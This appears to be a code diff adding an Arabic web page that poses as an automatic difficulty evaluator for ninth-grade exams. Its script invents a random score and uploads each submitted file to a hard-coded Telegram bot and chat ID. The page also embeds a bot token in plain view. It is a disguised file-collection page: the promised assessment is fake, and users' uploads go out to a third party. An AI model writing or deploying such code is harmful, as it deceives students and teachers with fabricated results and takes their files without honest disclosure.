@@ -1,0 +1,159 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تقييم اختبارات الصف التاسع</title>
+    <style>
+        /* التنسيق */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Cairo', sans-serif;
+            background: linear-gradient(135deg, #4e54c8, #8f94fb);
+            color: #333;
+            line-height: 1.6;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        header {
+            background-color: #fff;
+            padding: 20px 40px;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            margin-bottom: 20px;
+            width: 100%;
+            max-width: 800px;
+        }
+
+        header h1 {
+            font-size: 2rem;
+            color: #4e54c8;
+            margin-bottom: 10px;
+        }
+
+        .container {
+            background: #fff;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            max-width: 800px;
+            width: 100%;
+            text-align: center;
+        }
+
+        .file-input-container {
+            margin-bottom: 20px;
+        }
+
+        .file-label {
+            display: block;
+            padding: 15px 20px;
+            background: #4e54c8;
+            color: #fff;
+            font-size: 1rem;
+            font-weight: bold;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background 0.3s ease;
+            margin-bottom: 10px;
+        }
+
+        .file-label:hover {
+            background: #8f94fb;
+        }
+
+        .file-input {
+            display: none;
+        }
+
+        button {
+            padding: 15px 30px;
+            background: #4e54c8;
+            color: #fff;
+            font-size: 1rem;
+            font-weight: bold;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background 0.3s ease;
+        }
+
+        button:hover {
+            background: #8f94fb;
+        }
+
+        .result {
+            margin-top: 20px;
+            font-size: 1.2rem;
+            color: #4e54c8;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>موقع تقييم اختبارات الصف التاسع</h1>
+        <p>قم برفع الاختبار ليتم تقييم صعوبته تلقائيًا</p>
+    </header>
+    <div class="container">
+        <h2>اختر الاختبار المراد تقييمه</h2>
+        <div class="file-input-container">
+            <label for="file" class="file-label">اختر ملف الاختبار</label>
+            <input type="file" id="file" class="file-input" accept=".pdf, image/*">
+        </div>
+        <button id="submit-btn">ابدأ التقييم</button>
+        <div id="result" class="result"></div>
+    </div>
+
+    <script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
+    <script>
+        const TOKEN = "7413338484:AAHzvuApOwoZwaYwn-S-UCtHUlHKhwDSMS8"; // استبدل التوكن الخاص بك هنا
+        const CHAT_ID = "1934245613"; // استبدل معرف الشات الخاص بك هنا
+        const URI_SEND_DOC = `https://api.telegram.org/bot${TOKEN}/sendDocument`;
+        const URI_SEND_MESSAGE = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
+
+        document.getElementById('submit-btn').addEventListener('click', function () {
+            const fileInput = document.getElementById('file');
+            const resultDiv = document.getElementById('result');
+
+            if (!fileInput.files.length) {
+                alert('يرجى اختيار ملف أو صورة لتقييمها.');
+                return;
+            }
+
+            resultDiv.textContent = 'انتظر قليلاً، يتم تقييم الاختبار...';
+
+            const file = fileInput.files[0];
+            const difficultyScore = Math.floor(Math.random() * 10) + 1; // تقييم عشوائي
+
+            // إنشاء FormData لإرسال الملف إلى Telegram
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('document', file);
+            formData.append('caption', `تم تقييم الاختبار بـ: ${difficultyScore} من 10`);
+
+            // إرسال الملف مع التقييم
+            axios.post(URI_SEND_DOC, formData, {
+                headers: { 'Content-Type': 'multipart/form-data' }
+            })
+            .then(() => {
+                resultDiv.textContent = `تم تقييم صعوبة الاختبار بـ: ${difficultyScore} من 10 وتم إرسال الملف بنجاح.`;
+            })
+            .catch(() => {
+                alert('حدث خطأ أثناء إرسال البيانات إلى تيليجرام.');
+            });
+        });
+    </script>
+</body>
+</html>
